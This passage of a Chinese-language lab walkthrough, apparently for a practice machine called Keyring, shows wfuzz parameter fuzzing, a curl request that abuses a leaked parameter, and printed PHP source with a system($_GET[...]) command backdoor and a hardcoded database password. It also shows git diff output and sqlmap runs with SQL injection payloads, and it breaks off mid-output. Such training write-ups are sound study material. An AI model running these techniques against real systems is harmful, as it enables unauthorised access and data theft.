Contents (<span class="keyword">deb</span>) [<span class="number">47.9</span> MB]</span><br><span class="line">Ge<span class="variable">t:4</span> http://mirrors.aliyun.<span class="keyword">com</span>/kali kali-rolling/non-free arm64 Packages [<span class="number">148</span> kB]                                </span><br><span class="line">Ge<span class="variable">t:5</span> http://mirrors.aliyun.<span class="keyword">com</span>/kali kali-rolling/non-free arm64 Contents (<span class="keyword">deb</span>) [<span class="number">825</span> kB]                          </span><br><span class="line">Ge<span class="variable">t:6</span> http://mirrors.aliyun.<span class="keyword">com</span>/kali kali-rolling/contrib arm64 Packages [<span class="number">97.3</span> kB]                                </span><br><span class="line">Ge<span class="variable">t:7</span> http://mirrors.aliyun.<span class="keyword">com</span>/kali kali-rolling/contrib arm64 Contents (<span class="keyword">deb</span>) [<span class="number">179</span> kB]                           </span><br><span class="line">Fetched <span class="number">69.4</span> MB in <span class="number">13</span>s (<span class="number">5</span>,<span class="number">413</span> kB/s)                                                                               </span><br><span class="line"><span class="number">681</span> packages can <span class="keyword">be</span> upgraded. Run <span class="string">&#x27;apt list --upgradable&#x27;</span> <span class="keyword">to</span> see them.</span><br><span class="line">                                                                                                                   </span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# apt install seclists</span><br></pre></td></tr></table></figure></div>
<p>然后用wfuzz进行模糊参数名 扫出user</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MARKDOWN"><figure class="iseeu highlight /markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# wfuzz -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://192.168.240.230/history.php?FUZZ=kakeru -H &#x27;Cookie: PHPSESSID=fe7jj1h3ab3nh81dubr28mim8g&#x27; --hh 0</span><br><span class="line"> /usr/lib/python3/dist-packages/wfuzz/<span class="strong">__init__</span>.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#x27;s documentation for more information.</span><br><span class="line"><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span></span><br><span class="line"><span class="bullet">*</span> Wfuzz 3.1.0 - The Web Fuzzer                         *</span><br><span class="line"><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span></span><br><span class="line"></span><br><span class="line">Target: http://192.168.240.230/history.php?FUZZ=kakeru</span><br><span class="line">Total requests: 4734</span><br><span class="line"></span><br><span class="line">=====================================================================</span><br><span class="line"><span class="section">ID           Response   Lines    Word       Chars       Payload                                           </span></span><br><span class="line"><span class="section">=====================================================================</span></span><br><span class="line"></span><br><span class="line">000004339:   200        0 L      5 W        85 Ch       &quot;user&quot;                                            </span><br><span class="line"></span><br><span class="line">Total time: 0</span><br><span class="line">Processed Requests: 4734</span><br><span class="line">Filtered Requests: 4733</span><br><span class="line">Requests/sec.: 0</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>然后用这个参数污染漏洞访问admin的历史记录</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# curl http://<span class="number">192.168</span>.<span class="number">240.230</span>/<span class="keyword">history</span>.php?user=admin -H <span class="string">&quot;Cookie: PHPSESSID=fe7jj1h3ab3nh81dubr28mim8g&quot;</span></span><br><span class="line">Pages visited by user admin<span class="symbol">&lt;br&gt;</span><span class="symbol">&lt;br&gt;</span>https://github.<span class="keyword">com</span>/cyberbot75/keyring<span class="symbol">&lt;br&gt;</span><span class="symbol">&lt;br&gt;</span>    </span><br><span class="line">                                                             </span><br></pre></td></tr></table></figure></div>
<p>有github源码泄漏<br>在control.php中发现有一个注释，</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line">	<span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">	<span class="variable">$password</span> = <span class="string">&quot;sqluserrootpassw0r4&quot;</span>;</span><br><span class="line">	<span class="variable">$database</span> = <span class="string">&quot;users&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$database</span>);</span><br><span class="line">	<span class="variable">$name</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">	<span class="variable">$date</span> =  <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;HTTP Parameter Pollution or HPP in short is a vulnerability that occurs&lt;br&gt;due to passing of multiple parameters having same name&quot;</span>;</span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;insert into log (name , page_visited , date_time) values (&#x27;<span class="subst">$name</span>&#x27;,&#x27;control&#x27;,&#x27;<span class="subst">$date</span>&#x27;)&quot;</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>,<span class="variable">$sql</span>))</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">&quot;Date &amp; Time : &quot;</span>.<span class="variable">$date</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		<span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmdcntr&#x27;</span>]); <span class="comment">//system() function is not safe to use , dont&#x27; forget to remove it in production .</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: index.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>告诉我们会执行cmdcntr这个参数的命令，他没有及时删除<br>但是我直接在url利用发现并没有显示给我<br><img src="https://pic1.imgdb.cn/item/67a4c6a0d0e0a243d4fc53d1.png"><br>这里卡住了，看了视频知道，这个必须是管理员的账户才能用这个后门<br>发现过程：把源码下载下来，用git diff找出不同</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MEL"><figure class="iseeu highlight /mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">(base) kakeru@bogon Downloads % git clone https:<span class="comment">//github.com/cyberbot75/keyring.git</span></span><br><span class="line">Cloning into <span class="string">&#x27;keyring&#x27;</span>...</span><br><span class="line">remote: Enumerating objects: <span class="number">21</span>, done.</span><br><span class="line">remote: Counting objects: <span class="number">100</span>% (<span class="number">21</span>/<span class="number">21</span>), done.</span><br><span class="line">remote: Compressing objects: <span class="number">100</span>% (<span class="number">17</span>/<span class="number">17</span>), done.</span><br><span class="line">remote: Total <span class="number">21</span> (delta <span class="number">9</span>), reused <span class="number">0</span> (delta <span class="number">0</span>), pack-reused <span class="number">0</span> (from <span class="number">0</span>)</span><br><span class="line">Receiving objects: <span class="number">100</span>% (<span class="number">21</span>/<span class="number">21</span>), <span class="number">6.26</span> KiB | <span class="number">3.13</span> MiB/s, done.</span><br><span class="line">Resolving deltas: <span class="number">100</span>% (<span class="number">9</span>/<span class="number">9</span>), done.</span><br><span class="line">(base) kakeru@bogon Downloads % cd keyring </span><br><span class="line">(base) kakeru@bogon keyring % git <span class="keyword">log</span></span><br><span class="line">commit <span class="number">9215</span>fbd50358462a5868c04bfe93ea549c101a2b (HEAD -&gt; main, origin/main, origin/HEAD)</span><br><span class="line">Author: cyberbot75 &lt;<span class="number">79827735</span>+cyberbot75@users.noreply.github.com&gt;</span><br><span class="line">Date:   Mon Jun <span class="number">21</span> <span class="number">19</span>:<span class="number">07</span>:<span class="number">49</span> <span class="number">2021</span> +<span class="number">0530</span></span><br><span class="line"></span><br><span class="line">    Update <span class="keyword">control</span>.php</span><br><span class="line"></span><br><span class="line">commit d63d664e940253192aa05f4b5afe46204452f574</span><br><span class="line">Author: cyberbot75 &lt;<span class="number">79827735</span>+cyberbot75@users.noreply.github.com&gt;</span><br><span class="line">Date:   Mon Jun <span class="number">21</span> <span class="number">18</span>:<span class="number">33</span>:<span class="number">18</span> <span class="number">2021</span> +<span class="number">0530</span></span><br><span class="line"></span><br><span class="line">    Update <span class="keyword">control</span>.php</span><br><span class="line"></span><br><span class="line">commit <span class="number">460</span>cb9f1bf00701403393d4546797eee17121700</span><br><span class="line">Author: cyberbot75 &lt;<span class="number">79827735</span>+cyberbot75@users.noreply.github.com&gt;</span><br><span class="line">Date:   Thu Jun <span class="number">10</span> <span class="number">18</span>:<span class="number">56</span>:<span class="number">41</span> <span class="number">2021</span> +<span class="number">0530</span></span><br><span class="line"></span><br><span class="line">    Update <span class="keyword">control</span>.php</span><br><span class="line"></span><br><span class="line">commit <span class="number">1</span>a772923c80cb07d621d6e654a4e78819126e0a9</span><br><span class="line">Author: cyberbot75 &lt;<span class="number">79827735</span>+cyberbot75@users.noreply.github.com&gt;</span><br><span class="line">Date:   Thu Jun <span class="number">10</span> <span class="number">18</span>:<span class="number">55</span>:<span class="number">32</span> <span class="number">2021</span> +<span class="number">0530</span></span><br><span class="line"></span><br><span class="line">    Add files via upload</span><br><span class="line">(base) kakeru@bogon keyring % git diff <span class="number">9215</span>fbd50358462a5868c04bfe93ea549c101a2b <span class="number">460</span>cb9f1bf00701403393d4546797eee17121700</span><br><span class="line">diff --git a/html/<span class="keyword">control</span>.php b/html/<span class="keyword">control</span>.php</span><br><span class="line">index <span class="number">3</span>bb3250.<span class="number">.823</span>b4c5 <span class="number">100644</span></span><br><span class="line">--- a/html/<span class="keyword">control</span>.php</span><br><span class="line">+++ b/html/<span class="keyword">control</span>.php</span><br><span class="line">@@ <span class="number">-1</span>,<span class="number">5</span> +<span class="number">1</span>,<span class="number">3</span> @@</span><br><span class="line">-Code <span class="keyword">for</span> staging server</span><br><span class="line">-</span><br><span class="line"> &lt;!DOCTYPE html&gt;</span><br><span class="line"> &lt;html&gt;</span><br><span class="line"> &lt;head&gt;</span><br><span class="line">@@ <span class="number">-53</span>,<span class="number">7</span> +<span class="number">51</span>,<span class="number">10</span> @@ <span class="keyword">if</span>(isset($_SESSION[<span class="string">&#x27;name&#x27;</span>]))</span><br><span class="line">        $conn = mysqli_connect($servername, $username, $password, $database);</span><br><span class="line">        $name = $_SESSION[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        $date =  <span class="keyword">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>);</span><br><span class="line">-       echo <span class="string">&quot;HTTP Parameter Pollution or HPP in short is a vulnerability that occurs&lt;br&gt;due to passing of multiple parameters having same name&quot;</span>;</span><br><span class="line">+</span><br><span class="line">+       <span class="keyword">if</span>($name===<span class="string">&quot;admin&quot;</span>)</span><br><span class="line">+       &#123;</span><br><span class="line">+               echo <span class="string">&quot;HTTP Parameter Pollution or HPP in short is a vulnerability that occurs&lt;br&gt;due to passing of multiple parameters having same name&quot;</span>;</span><br><span class="line">                $sql = <span class="string">&quot;insert into log (name , page_visited , date_time) values (&#x27;$name&#x27;,&#x27;control&#x27;,&#x27;$date&#x27;)&quot;</span>;</span><br><span class="line"> </span><br><span class="line">                <span class="keyword">if</span>(mysqli_query($conn,$sql))</span><br><span class="line">@@ <span class="number">-61</span>,<span class="number">7</span> +<span class="number">62</span>,<span class="number">12</span> @@ <span class="keyword">if</span>(isset($_SESSION[<span class="string">&#x27;name&#x27;</span>]))</span><br><span class="line">                                echo <span class="string">&quot;&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">                                echo <span class="string">&quot;Date &amp; Time : &quot;</span>.$date;</span><br><span class="line">                        &#125;</span><br><span class="line">-               <span class="keyword">system</span>($_GET[<span class="string">&#x27;cmdcntr&#x27;</span>]); <span class="comment">//system() function is not safe to use , dont&#x27; forget to remove it in production .</span></span><br><span class="line">+               <span class="keyword">system</span>($_GET[<span class="string">&#x27;timer&#x27;</span>]); <span class="comment">//system() is not safe to use , dont&#x27; forget to remove it  in latest release .</span></span><br><span class="line">+       &#125;</span><br><span class="line">:</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>先用sqlmap进行注入</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# sqlmap -u 192.168.240.230/history.php?<span class="attribute">user</span>=kakeru <span class="attribute">--cookie</span>=<span class="string">&quot;PHPSESSID=fe7jj1h3ab3nh81dubr28mim8g&quot;</span> --batch --dbs</span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[(]_____ ___ ___  &#123;1.8.12#stable&#125;</span><br><span class="line">|_ -| . [,]     | .<span class="string">&#x27;| . |</span></span><br><span class="line"><span class="string">|___|_  [(]_|_|_|__,|  _|</span></span><br><span class="line"><span class="string">      |_|V...       |_|   https://sqlmap.org</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;</span>s responsibility <span class="keyword">to</span> obey all applicable local, state <span class="keyword">and</span> federal laws. Developers assume <span class="literal">no</span> liability <span class="keyword">and</span> are <span class="keyword">not</span> responsible <span class="keyword">for</span> any misuse <span class="keyword">or</span> damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 20:54:45 /2025-02-06/</span><br><span class="line"></span><br><span class="line">[20:54:45] [<span class="built_in">INFO</span>] testing<span class="built_in"> connection </span><span class="keyword">to</span> the target URL</span><br><span class="line">[20:54:45] [<span class="built_in">INFO</span>] checking <span class="keyword">if</span> the target is protected by some kind of WAF/IPS</span><br><span class="line">[20:54:45] [<span class="built_in">INFO</span>] testing <span class="keyword">if</span> the target URL content is stable</span><br><span class="line">[20:54:45] [<span class="built_in">INFO</span>] target URL content is stable</span><br><span class="line">[20:54:45] [<span class="built_in">INFO</span>] testing <span class="keyword">if</span> <span class="built_in">GET</span> parameter <span class="string">&#x27;user&#x27;</span> is dynamic</span><br><span class="line">[20:54:45] [<span class="built_in">INFO</span>] <span class="built_in">GET</span> parameter <span class="string">&#x27;user&#x27;</span> appears <span class="keyword">to</span> be dynamic</span><br><span class="line">[20:54:45] [<span class="built_in">WARNING</span>] heuristic (basic) test shows that <span class="built_in">GET</span> parameter <span class="string">&#x27;user&#x27;</span> might <span class="keyword">not</span> be injectable</span><br><span class="line">[20:54:45] [<span class="built_in">INFO</span>] testing <span class="keyword">for</span> SQL injection on <span class="built_in">GET</span> parameter <span class="string">&#x27;user&#x27;</span></span><br><span class="line">[20:54:45] [<span class="built_in">INFO</span>] testing <span class="string">&#x27;AND boolean-based blind - WHERE or HAVING clause&#x27;</span></span><br><span class="line">[20:54:46] [<span class="built_in">WARNING</span>] reflective value(s) found <span class="keyword">and</span> filtering out</span><br><span class="line">[20:54:46] [<span class="built_in">INFO</span>] testing <span class="string">&#x27;Boolean-based blind - Parameter replace (original value)&#x27;</span></span><br><span class="line">[20:54:46] [<span class="built_in">INFO</span>] testing <span class="string">&#x27;MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)&#x27;</span></span><br><span class="line">[20:54:46] [<span class="built_in">INFO</span>] testing <span class="string">&#x27;PostgreSQL AND error-based - WHERE or HAVING clause&#x27;</span></span><br><span class="line">[20:54:46] [<span class="built_in">INFO</span>] testing <span class="string">&#x27;Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)&#x27;</span></span><br><span class="line">[20:54:46] [<span class="built_in">INFO</span>] testing <span class="string">&#x27;Oracle AND error-based - WHERE or HAVING clause (XMLType)&#x27;</span></span><br><span class="line">[20:54:46] [<span class="built_in">INFO</span>] testing <span class="string">&#x27;Generic inline queries&#x27;</span></span><br><span class="line">[20:54:46] [<span class="built_in">INFO</span>] testing <span class="string">&#x27;PostgreSQL &gt; 8.1 stacked queries (comment)&#x27;</span></span><br><span class="line">[20:54:46] [<span class="built_in">INFO</span>] testing <span class="string">&#x27;Microsoft SQL Server/Sybase stacked queries (comment)&#x27;</span></span><br><span class="line">[20:54:46] [<span class="built_in">INFO</span>] testing <span class="string">&#x27;Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)&#x27;</span></span><br><span class="line">[20:54:46] [<span class="built_in">INFO</span>] testing <span class="string">&#x27;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#x27;</span></span><br><span class="line">[20:54:56] [<span class="built_in">INFO</span>] <span class="built_in">GET</span> parameter <span class="string">&#x27;user&#x27;</span> appears <span class="keyword">to</span> be <span class="string">&#x27;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#x27;</span> injectable </span><br><span class="line">it looks like the back-end DBMS is <span class="string">&#x27;MySQL&#x27;</span>. <span class="keyword">Do</span> you want <span class="keyword">to</span> skip test payloads specific <span class="keyword">for</span> other DBMSes? [Y/n] Y</span><br><span class="line"><span class="keyword">for</span> the remaining tests, <span class="keyword">do</span> you want <span class="keyword">to</span> include all tests <span class="keyword">for</span> <span class="string">&#x27;MySQL&#x27;</span> extending provided level (1) <span class="keyword">and</span> risk (1) values? [Y/n] Y</span><br><span class="line">[20:54:56] [<span class="built_in">INFO</span>] testing <span class="string">&#x27;Generic UNION query (NULL) - 1 to 20 columns&#x27;</span></span><br><span class="line">[20:54:56] [<span class="built_in">INFO</span>] automatically extending ranges <span class="keyword">for</span> UNION query injection technique tests as there is at least one other (potential) technique found</span><br><span class="line">[20:54:56] [<span class="built_in">INFO</span>] target URL appears <span class="keyword">to</span> be UNION injectable with 1 columns</span><br><span class="line">[20:54:56] [<span class="built_in">INFO</span>] <span class="built_in">GET</span> parameter <span class="string">&#x27;user&#x27;</span> is <span class="string">&#x27;Generic UNION query (NULL) - 1 to 20 columns&#x27;</span> injectable</span><br><span class="line"><span class="built_in">GET</span> parameter <span class="string">&#x27;user&#x27;</span> is vulnerable. <span class="keyword">Do</span> you want <span class="keyword">to</span> keep testing the others (<span class="keyword">if</span> any)? [y/N] N</span><br><span class="line">sqlmap identified the following injection point(s) with a total of 74 HTTP(s) requests:</span><br><span class="line">---</span><br><span class="line">Parameter:<span class="built_in"> user </span>(GET)</span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 <span class="keyword">AND</span> time-based blind (query SLEEP)</span><br><span class="line">    Payload: <span class="attribute">user</span>=kakeru&#x27; <span class="keyword">AND</span> (SELECT 9710 <span class="keyword">FROM</span> (SELECT(SLEEP(5)))Gxfh) <span class="keyword">AND</span> <span class="string">&#x27;flol&#x27;</span>=<span class="string">&#x27;flol</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: UNION query</span></span><br><span class="line"><span class="string">    Title: Generic UNION query (NULL) - 1 column</span></span><br><span class="line"><span class="string">    Payload: user=kakeru&#x27;</span> UNION ALL SELECT CONCAT(0x7178787871,0x65647271467a6477744472684547474a74614e4e59464276706668634d4f4d5576495a45414a6b72,0x717a6a7a71)-- -</span><br><span class="line">---</span><br><span class="line">[20:54:56] [<span class="built_in">INFO</span>] the back-end DBMS is MySQL</span><br><span class="line">web<span class="built_in"> server </span>operating system: Linux Ubuntu 18.04 (bionic)</span><br><span class="line">web application technology: Apache 2.4.29</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0.12</span><br><span class="line">[20:54:56] [<span class="built_in">INFO</span>] fetching database names</span><br><span class="line">available databases [5]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] sys</span><br><span class="line">[*]<span class="built_in"> users</span></span><br><span class="line"><span class="built_in"></span></span><br><span class="line">[20:54:56] [<span class="built_in">INFO</span>] fetched data logged <span class="keyword">to</span> text files under <span class="string">&#x27;/root/.local/share/sqlmap/output/192.168.240.230&#x27;</span></span><br><span class="line"></span><br><span class="line">[*] ending @ 20:54:56 /2025-02-06/</span><br><span class="line"></span><br><span class="line">                                                                                                                   </span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# sqlmap -u 192.168.240.230/history.php?<span class="attribute">user</span>=kakeru <span class="attribute">--cookie</span>=<span class="string">&quot;PHPSESSID=fe7jj1h3ab3nh81dubr28mim8g&quot;</span> --batch -D<span class="built_in"> users </span>--tables</span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[<span class="string">&quot;]_____ ___ ___  &#123;1.8.12#stable&#125;</span></span><br><span class="line"><span class="string">|_ -| . [&quot;</span>]     | .<span class="string">&#x27;| . |</span></span><br><span class="line"><span class="string">|___|_  [,]_|_|_|__,|  _|</span></span><br><span class="line"><span class="string">      |_|V...       |_|   https://sqlmap.org</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;</span>s responsibility <span class="keyword">to</span> obey all applicable local, state <span class="keyword">and</span> federal laws. Developers assume <span class="literal">no</span> liability <span class="keyword">and</span> are <span class="keyword">not</span> responsible <span class="keyword">for</span> any misuse <span class="keyword">or</span> damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 20:55:57 /2025-02-06/</span><br><span class="line"></span><br><span class="line">[20:55:57] [<span class="built_in">INFO</span>] resuming back-end DBMS <span class="string">&#x27;mysql&#x27;</span> </span><br><span class="line">[20:55:57] [<span class="built_in">INFO</span>] testing<span class="built_in"> connection </span><span class="keyword">to</span> the target URL</span><br><span class="line">sqlmap resumed the following injection point(s) <span class="keyword">from</span> stored session:</span><br><span class="line">---</span><br><span class="line">Parameter:<span class="built_in"> user </span>(GET)</span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: 